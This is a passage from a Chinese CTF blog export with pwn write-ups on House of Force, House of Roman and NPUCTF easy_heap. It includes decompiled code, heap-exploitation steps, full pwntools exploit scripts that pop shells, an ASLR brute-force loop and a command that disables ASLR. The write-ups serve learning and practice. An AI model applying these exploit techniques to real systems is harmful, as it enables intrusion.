show():</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic &#x3D; 0x400d49</span><br><span class="line"># we must alloc enough size, so as to successfully alloc from fake topchunk</span><br><span class="line">additem(0x30, &quot;ddaa&quot;)  # idx 0</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">payload &#x3D; 0x30 * &#39;a&#39;  # idx 0&#39;s content</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 8 + p64(0xffffffffffffffff)  # top chunk&#39;s prev_size and size</span><br><span class="line"># modify topchunk&#39;s size to -1</span><br><span class="line">modify(0, 0x41, payload)</span><br><span class="line"></span><br><span class="line"># top chunk&#39;s offset to heap base</span><br><span class="line">offset_to_heap_base &#x3D; -(0x40 + 0x20)</span><br><span class="line">malloc_size &#x3D; offset_to_heap_base - 0x8</span><br><span class="line">additem(malloc_size, &quot;dada&quot;)</span><br><span class="line"></span><br><span class="line">additem(0x10, p64(magic) * 2)</span><br><span class="line">print r.recv()</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">r.sendline(&#39;5&#39;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/#hitcon-training-lab-11" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/#hitcon-training-lab-11</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>House of Force</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Roman</title>
    <url>/2020/05/13/House-of-Roman/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/ABlMdTQ4JwDu9qY.png" alt="alt"></p>
<a id="more"></a>

<h3 id="介绍（CTF-WIKI）"><a href="#介绍（CTF-WIKI）" class="headerlink" title="介绍（CTF WIKI）"></a>介绍（CTF WIKI）</h3><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。House of Roman可以在开启了ALSR地址随机化的情况下，通过爆破12bit的方式来进行getshell，爆破概率为1/4096</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>程序中存在UAF或者能够达到修改fastbin的fd指针效果的漏洞</li>
<li>可以申请任意大小的chunk块</li>
</ul>
<p>以一道例题来了解House of Roman</p>
<h3 id="new-chall"><a href="#new-chall" class="headerlink" title="new_chall"></a>new_chall</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下"><a href="#main函数如下" class="headerlink" title="main函数如下:"></a>main函数如下:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; &#x2F;&#x2F; rdi@1</span><br><span class="line">  int v4; &#x2F;&#x2F; [sp+8h] [bp-8h]@2</span><br><span class="line">  int v5; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  v3 &#x3D; stderr;</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  start_p(v3, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">    switch ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        puts(&quot;Malloc&quot;);</span><br><span class="line">        v5 &#x3D; malloc_chunk();</span><br><span class="line">        if ( !v5 )</span><br><span class="line">          puts(&quot;Error&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        puts(&quot;Write&quot;);</span><br><span class="line">        write_chunk();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        puts(&quot;Free&quot;);</span><br><span class="line">        free_chunk();</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="malloc-chunk函数如下："><a href="#malloc-chunk函数如下：" class="headerlink" title="malloc_chunk函数如下："></a>malloc_chunk函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 malloc_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  void *v1; &#x2F;&#x2F; rax@3</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  size_t size; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Enter size of chunk :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;size);</span><br><span class="line">  printf(&quot;Enter index :&quot;, &amp;size);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  if ( v2 &lt;&#x3D; 0x13 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; malloc(size);</span><br><span class="line">    *(&amp;size + 4) &#x3D; v1;</span><br><span class="line">    heap_ptrs[v2] &#x3D; v1;</span><br><span class="line">    sizes[v2] &#x3D; size;</span><br><span class="line">    result &#x3D; *(&amp;size + 4);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="write-chunk函数如下："><a href="#write-chunk函数如下：" class="headerlink" title="write_chunk函数如下："></a>write_chunk函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int write_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@2</span><br><span class="line">  unsigned int v1; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+Ch] [bp-4h]@5</span><br><span class="line"></span><br><span class="line">  printf(&quot;\nEnter index of chunk :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;&#x3D; 0x13 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( heap_ptrs[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 &#x3D; sizes[v1];</span><br><span class="line">      printf(&quot;Enter data :&quot;, &amp;v1);</span><br><span class="line">      result &#x3D; read(0, heap_ptrs[v1], v2 + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; puts(&quot;Bad index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;\nInvalid index&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>

<h4 id="free-chunk函数如下："><a href="#free-chunk函数如下：" class="headerlink" title="free_chunk函数如下："></a>free_chunk函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;\nEnter index :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v0);</span><br><span class="line">  if ( v0 &lt;&#x3D; 0x13 )</span><br><span class="line">    free(heap_ptrs[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现程序没有类似show()函数，但是write_chunk中有off by one 漏洞，在free_chunk函数中free没有置NULL，存在uaf漏洞，而且程序可以申请任意大小的chunk。这些条件符合House of Roman 利用条件。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>首先申请大于144的chunk A，然后free掉，这样chunk中就有<code>main_arean</code>的地址了</li>
<li>然后申请俩个0x70的chunk，C和D，然后都free掉，此时利用off by one 修改A的size位为0x70</li>
<li>利用uaf将原本D–&gt;C的bins链表修改为D—&gt;A</li>
<li>通过 修改低 2个字节，可以修改到 <code>malloc_hook - 0x23</code> 处 （ <code>malloc_hook - 0x23 + 0x8</code> 处的值为 <code>p64(0x7f)</code> )</li>
<li>连续malloc三次，申请到<code>malloc_hook - 0x23</code>这个chunk，这里要记得修复fastbin，因为链表中fd会指<code>malloc_hook - 0x23</code>这个chunk的fd，所以我们malloc三次后，要再free进这个bins链中一个chunk，然后将其fd置0,。</li>
<li>利用unsorted_bin_attack使<code>malloc_hook</code>地址的值为 <code>main_arena+88</code> 这里可以看我博客中关于unsorted_bin_attack的利用</li>
<li>修改<code>malloc_hook</code>地址的值的低3个字节，将其修改为one_gadget地址。</li>
<li>俩次free函数触发malloc_printerr<code>，</code>getshell</li>
</ol>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;new_chall&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;new_chall&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">def add(size,index) :</span><br><span class="line">	sh.recvuntil(&#39;Free\n&#39;)</span><br><span class="line">	sh.sendline(str(1))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def write(index,content) :</span><br><span class="line">	sh.recvuntil(&#39;Free\n&#39;)</span><br><span class="line">        sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(content)</span><br><span class="line">def free(index) :</span><br><span class="line">	sh.recvuntil(&#39;Free\n&#39;)</span><br><span class="line">        sh.sendline(str(3))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(&#39;aaaa&#39;)</span><br><span class="line">add(0x18,0) #A</span><br><span class="line">add(0xc8,1) #B</span><br><span class="line">add(0x65,2) #C</span><br><span class="line"></span><br><span class="line">#fake chunk</span><br><span class="line">fake&#x3D;&#39;a&#39;*0x68+p64(0x61)</span><br><span class="line">write(1,fake)#B</span><br><span class="line"></span><br><span class="line">#main_arean</span><br><span class="line">free(1) #B</span><br><span class="line">add(0xc8,1)#B</span><br><span class="line"></span><br><span class="line">add(0x65,3) #D</span><br><span class="line">add(0x65,15)#E 0x5555557571d0</span><br><span class="line">add(0x65,18) #F</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#off by one</span><br><span class="line">over&#x3D;&#39;a&#39;*0x18+&#39;\x71&#39;</span><br><span class="line">write(0,over)</span><br><span class="line"></span><br><span class="line">#D--&gt;B</span><br><span class="line">free(2) #C</span><br><span class="line">free(3) #D</span><br><span class="line">heap_po&#x3D;&#39;\x20&#39;</span><br><span class="line">write(3,heap_po)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#malloc_hook_nearly</span><br><span class="line">malloc_hook_nearly &#x3D; &quot;\xed\x1a&quot;</span><br><span class="line">write(1,malloc_hook_nearly)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">add(0x65,0) </span><br><span class="line">add(0x65,0)  </span><br><span class="line">add(0x65,0) #A</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">free(15)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">write(15,p64(0x00))</span><br><span class="line"></span><br><span class="line">add(0xc8,1)</span><br><span class="line">add(0xc8,2)</span><br><span class="line">free(1)</span><br><span class="line">payload&#x3D;&#39;b&#39;*0x8+&#39;\x00\x1b&#39;</span><br><span class="line">write(1,payload)</span><br><span class="line">add(0xc8,1)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">over &#x3D; &quot;R&quot;*0x13   # padding for malloc_hook</span><br><span class="line">over +&#x3D; &quot;\xa4\xd2\xaf&quot;</span><br><span class="line">write(0,over)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">free(18)</span><br><span class="line">free(18)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>调试的时候记得关掉aslr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>

<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>因为需要爆破，所以写个脚本，碰运气</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 5000&#96;; do python final.py; done;</span><br></pre></td></tr></table></figure>



<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://xz.aliyun.com/t/2316#toc-5" target="_blank" rel="noopener external nofollow noreferrer">https://xz.aliyun.com/t/2316#toc-5</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_roman-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_roman-zh/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>House of Roman</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF--PWN--WP复现</title>
    <url>/2020/05/14/NPUCTF-PWN-WP%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/XAYmHTfq8ogvKzw.png" alt="alt"></p>
<a id="more"></a>

<p>之前打的NPUCTF发现自己什么都不会，一直想着复现，拖了这么久，今天就复现一下。这次复现学到了很多，发现自己好菜。呜呜呜<del>~</del></p>
<h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+4h] [bp-Ch]@2</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(0, &amp;buf, 4uLL);</span><br><span class="line">    v3 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( (unsigned int)v3 &lt;&#x3D; 5 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Invalid Choice&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(__CS__, (char *)dword_401140 + dword_401140[(unsigned __int64)(unsigned int)v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="create-函数如下："><a href="#create-函数如下：" class="headerlink" title="create()函数如下："></a>create()函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 create()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; &#x2F;&#x2F; rbx@9</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+4h] [bp-2Ch]@1</span><br><span class="line">  size_t size; &#x2F;&#x2F; [sp+8h] [bp-28h]@6</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-20h]@6</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-18h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !heaparray[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      heaparray[i] &#x3D; malloc(0x10uLL);</span><br><span class="line">      if ( !heaparray[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Size of Heap(0x10 or 0x20 only) : &quot;);</span><br><span class="line">      read(0, &amp;buf, 8uLL);</span><br><span class="line">      size &#x3D; atoi(&amp;buf);</span><br><span class="line">      if ( size !&#x3D; 24 &amp;&amp; size !&#x3D; 56 )</span><br><span class="line">        exit(-1);</span><br><span class="line">      v0 &#x3D; heaparray[i];</span><br><span class="line">      v0[1] &#x3D; malloc(size);</span><br><span class="line">      if ( !*((_QWORD *)heaparray[i] + 1) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(2);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_QWORD *)heaparray[i] &#x3D; size;</span><br><span class="line">      printf(&quot;Content:&quot;, &amp;buf);</span><br><span class="line">      read_input(*((_QWORD *)heaparray[i] + 1), size);</span><br><span class="line">      puts(&quot;Done!&quot;);</span><br><span class="line">      return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, (char *)&amp;v1 + 4, 4uLL);</span><br><span class="line">  LODWORD(v1) &#x3D; atoi((const char *)&amp;v1 + 4);</span><br><span class="line">  if ( (signed int)v1 &lt; 0 || (signed int)v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( heaparray[(signed int)v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Content: &quot;, (char *)&amp;v1 + 4, v1);</span><br><span class="line">    read_input(*((_QWORD *)heaparray[(signed int)v1] + 1), *(_QWORD *)heaparray[(signed int)v1] + 1LL);   #off_by_one漏洞</span><br><span class="line">    puts(&quot;Done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;How Dare you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下："><a href="#show函数如下：" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 show()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, (char *)&amp;v1 + 4, 4uLL);</span><br><span class="line">  LODWORD(v1) &#x3D; atoi((const char *)&amp;v1 + 4);</span><br><span class="line">  if ( (signed int)v1 &lt; 0 || (signed int)v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( heaparray[(signed int)v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(</span><br><span class="line">      &quot;Size : %ld\nContent : %s\n&quot;,</span><br><span class="line">      *(_QWORD *)heaparray[(signed int)v1],</span><br><span class="line">      *((_QWORD *)heaparray[(signed int)v1] + 1),</span><br><span class="line">      v1);</span><br><span class="line">    puts(&quot;Done!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;How Dare you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete函数如下："><a href="#delete函数如下：" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4uLL);</span><br><span class="line">  v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)heaparray[v1] + 1));</span><br><span class="line">    free(heaparray[v1]);</span><br><span class="line">    heaparray[v1] &#x3D; 0LL;</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;How Dare you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在edit()函数发现off_by_one，我们可以利用它来修改某个chunk的size位，来造成堆块的重叠，从而可以修改&amp;content的地址，实现任意地址的读写。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python </span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27902)</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;easyheap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;easyheap&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def edit(index,content) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(3))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def delete(index) :</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(4))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">add(0x18,&#39;aaaaa&#39;) #0</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x38,&#39;bbbbbb&#39;) #0</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x18,&#39;cccccc&#39;) #1</span><br><span class="line">payload&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">add(0x18,&#39;ddddddd&#39;) #2</span><br><span class="line">add(0x18,payload)#3</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x30+p64(0)+&#39;\x41&#39;</span><br><span class="line">edit(0,payload2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload3&#x3D;&#39;a&#39;*0x10+p64(0)+p64(0x21)+p64(0x18)+p64(free_got)</span><br><span class="line">add(0x38,payload3)</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&#39;Content : &#39;)</span><br><span class="line">free_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;free_addr:&#39; +hex(free_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;free&#39;,free_addr)</span><br><span class="line">libc_base&#x3D;free_addr-libc.dump(&#39;free&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">print(&#39;system_addr:&#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">payload4&#x3D;p64(system_addr)</span><br><span class="line">edit(2,payload4)</span><br><span class="line">delete(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><h4 id="checksec检查-1"><a href="#checksec检查-1" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-1"><a href="#main函数如下：-1" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0x64uLL);</span><br><span class="line">    if ( !strcmp(buf, &quot;66666666&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    printf(buf, &quot;66666666&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

